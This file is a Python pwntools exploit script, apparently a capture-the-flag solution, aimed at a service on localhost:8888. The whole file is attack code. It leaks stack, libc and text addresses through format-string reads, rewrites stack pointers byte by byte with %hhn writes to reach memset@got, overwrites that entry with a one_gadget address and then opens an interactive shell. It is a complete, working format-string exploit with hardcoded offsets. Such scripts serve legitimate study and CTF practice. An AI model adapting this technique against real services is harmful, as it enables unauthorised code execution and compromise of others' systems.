#! /usr/bin/env python

from pwn import *

def takeFirst(e):
    return e[0]

io = remote("localhost", 8888)

raw_input('@')

fmt_leak_stack = '%6$p'
fmt_leak_libc = '%11$p'
fmt_leak_text = '%7$p'
MARK = 'AAAA'

io.sendafter(':)',fmt_leak_stack + MARK + fmt_leak_libc + MARK + fmt_leak_text + MARK + MARK)
leak_stack = int(io.recvuntil(MARK, True), 16)
leak_libc = int(io.recvuntil(MARK, True), 16)
leak_text = int(io.recvuntil(MARK, True), 16)

# libc_index is the index of __libc_start_main in libc
libc_index = 0x20740+240        # local version
libc_base = leak_libc - libc_index

print "libc base = " + hex(libc_base)

# use one gadget to exploit
one_gadget = libc_base + 0x45216    # local version

# use libc system to exploit
#system = libc_base + 0x45390         # local version
#one_gadget = system

memset_got = leak_text + 0x2004e2

print hex(one_gadget)
print hex(memset_got)

p2cursor = 6
cursor = 8

cursor_low = (leak_stack + 0x10)%0x100

# use p2cursor to control cursor to write address to memset@got 
# write $rsp+0x20, point to memset@got + 1
temp_memset_got = memset_got

for i in range(0,6):
    memset_got_byte = temp_memset_got%0x100
    temp_memset_got /= 0x100
    if i == 0:
        memset_got_byte += 1        # point to memset@got + 1

    fmt_mv_cursor = '%' + str(cursor_low + i) + 'c' + '%' + str(p2cursor) + '$hhn' + MARK
    io.sendafter( MARK, fmt_mv_cursor)
    fmt_memset_got = '%' + str(memset_got_byte) + 'c'+ '%' + str(cursor) + '$hhn' + MARK
    io.sendafter( MARK, fmt_memset_got)

# write at $rsp+0x18, point to memset@got
temp_memset_got = memset_got
cursor_low = cursor_low - 0x8

for i in range(0,6):
    memset_got_byte = temp_memset_got%0x100
    temp_memset_got /= 0x100

    fmt_mv_cursor = '%' + str(cursor_low + i) + 'c' + '%' + str(p2cursor) + '$hhn' + MARK
    io.sendafter( MARK, fmt_mv_cursor)
    fmt_memset_got = '%' + str(memset_got_byte) + 'c'+ '%' + str(cursor) + '$hhn' + MARK
    io.sendafter( MARK, fmt_memset_got)

# write at $rsp+0x28, point to memset@got+2
# have to write 6 bytes this time.
temp_memset_got = memset_got
cursor_low = cursor_low + 0x10

for i in range(0,6):
    memset_got_byte = temp_memset_got%0x100
    temp_memset_got /= 0x100
    if i == 0:
        memset_got_byte += 2        # point to memset@got + 2

    fmt_mv_cursor = '%' + str(cursor_low + i) + 'c' + '%' + str(p2cursor) + '$hhn' + MARK
    io.sendafter( MARK, fmt_mv_cursor)
    fmt_memset_got = '%' + str(memset_got_byte) + 'c'+ '%' + str(cursor) + '$hhn' + MARK
    io.sendafter( MARK, fmt_memset_got)


# hijecting the got

onegadget_low = one_gadget%0x100                # 1 byte
onegadget_mid = (one_gadget/0x100)%0x100        # 1 byte
onegadget_high = (one_gadget/0x10000)%0x100     # 1 byte

fmt_list = [ (onegadget_low, 9), (onegadget_mid, 10), (onegadget_high, 11) ]    # (value_want_to_write, position_to_write)

fmt_list.sort(key=takeFirst)


#raw_input('ready for the final fmt!')
fmt_overwrite_got = ''
pre = 0
for i in range(0,3):
    fmt_overwrite_got += '%' + str(fmt_list[i][0] - pre) + 'c' + '%' + str(fmt_list[i][1]) +'$hhn'
    pre = fmt_list[i][0]
fmt_overwrite_got += MARK
io.sendafter( MARK, fmt_overwrite_got)
sleep(3)
io.recvuntil(MARK)

io.interactive()
